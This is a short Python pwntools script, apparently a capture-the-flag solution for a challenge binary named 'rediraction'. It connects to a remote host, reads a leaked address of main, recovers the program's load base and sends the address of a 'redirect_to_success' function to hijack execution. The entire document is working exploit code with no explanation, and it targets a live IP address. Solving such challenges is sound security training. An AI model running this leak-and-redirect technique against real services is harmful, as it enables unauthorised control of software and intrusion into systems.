from pwn import *
elf = context.binary = ELF("./rediraction")
# p = process()
p = remote("34.131.133.224",12346)
p.recvuntil(b"Main function address: ")
leak_main = int(p.recvline().strip().decode(),16)
offset_main = elf.sym['main']
elf.address = leak_main - offset_main
p.sendline(hex(elf.sym['redirect_to_success']))
print(p.recvall().strip().decode())